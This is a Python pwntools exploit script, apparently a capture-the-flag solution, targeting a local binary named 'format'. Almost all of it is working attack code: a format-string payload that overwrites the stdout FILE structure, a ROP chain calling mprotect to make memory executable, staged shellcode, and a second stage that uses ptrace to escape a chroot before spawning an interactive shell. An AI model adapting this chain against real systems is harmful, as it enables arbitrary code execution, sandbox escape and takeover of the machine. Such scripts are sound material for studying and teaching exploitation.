from libformatstr import *
from pwn import *
# from mypwn import *
# from zio import *

#context.log_level = 'debug'
target = 'strace -f -o aa.txt ./format'


# p = zio(target)

def interact(io):
    def run_recv():
        while True:
            try:
                output = io.read_until_timeout(timeout=1)
                # print output
            except:
                return

    t1 = Thread(target=run_recv)
    t1.start()
    while True:
        d = raw_input()
        if d != '':
            io.writeline(d)

p=process(['./format'])
#p = remote('127.0.0.1',9999)
stdout=0x6CC300

f=FormatStr(isx64=1,autosort=False)
f[stdout+0xa0]=stdout
f[stdout+0x98]=stdout+0x30
f[stdout+0x50]=0x400BD0 # input function
f.dword(stdout+0xd8,0x4BF780-0x38)
# gdb attach `ps -aux|grep ./format$|awk '{print $2}'|sort -r`
raw_input('wait to debug')
p.writeline(f.payload(6))

#Now we are able to modify the whole struct of stdout.

raw_input('wait to debug')
with p.waitfor('Receiving all data') as h:
    with p.local(3):
        try:
            while True:
                if not p.recv():
                    break
        except EOFError:
            pass

context.arch='amd64'

# this is going to modify the page protection
payload='\x00'*0x20
payload+=p64(stdout+0x68) # new stack
payload+=p64(0)
payload+=p64(0x44ad50) # xchg eax, esp ; ret
payload+=p64(0x442fa9) # pop rdx ; pop rsi
payload+=p64(7)
payload+=p64(0x1000)
payload+=p64(0x4006b5) #pop rdi
payload+=p64(stdout&0xfffff000)
payload+=p64(0x400644) #add rsp, 0x10 ; pop rbx ; ret
payload+=p64(0xdeadbeef)
payload+=p64(stdout-0x10)
payload+=p64(0xdeadbeef)
payload+=p64(0x4405F0) #mprotect
payload+=p64(stdout+0xc0) # shellcode

# now we can execute our shellcode.
shellcode=asm('''
    xor	r9d, r9d
    xor	edi, edi
    mov r8d, 0xFFFFFFFF
    mov	ecx, 0x22
    mov	edx, 7
    mov	esi, 0x4000
    mov rax, 0x440510
    call rax

    mov rsi,rax
    xor rdi,rdi
    mov rdx,0x4000
    mov rax,rdi
    syscall
    jmp rsi

''')

#shellcode = asm(shellcraft.amd64.ret(0x400BD0))

payload+=shellcode

raw_input('wait to debug')
p.writeline(payload)

# bypass the chroot via ptrace
shellcode=asm('''
    xor	r9d, r9d
    xor	edi, edi
    mov r8d, 0xFFFFFFFF
    mov	ecx, 0x22
    mov	edx, 3
    mov	esi, 0x4000
    mov rax, 0x440510
    call rax
    mov rbp,rax
    add rax,0x3f00
    mov rsp,rax

    xor rax,rax
    mov al,110
    syscall

    mov r15,rax
    mov rsi,rax
    mov di,0x10
    xor r10,r10
    mov rdx,r10
    call ptrace

    xor rsi,rsi
    mov rdi,r15
    call wait

    call getaddr
    xor r12,r12
    mov rbx,r12
    mov rdx,0x43efc0
    mov r14,rax

write:
    mov rdi,5
    mov r10,qword ptr [r14]
    mov rsi,r15
    call ptrace

    inc r12
    cmp r12,5
    add rdx,8
    add r14,8
    jnz write

    mov di,17
    mov rsi,r15
    xor rdx,rdx
    mov r10,rdx
    call ptrace

    xor rax,rax
    mov rdi,rax
    mov al,60
    syscall
ptrace:
    xor rax,rax
    mov al,0x65
    syscall
    ret

wait:

    xor     r10d, r10d
    movsxd  rdx, edx
    movsxd  rdi, edi
    mov     eax, 0x3D
    syscall
    ret

getaddr:
    lea rax,[rip+1]
    ret
'''+shellcraft.amd64.linux.sh())

p.writeline(shellcode.ljust(0x4000,'\x90'))

# p.interact()
p.interactive()
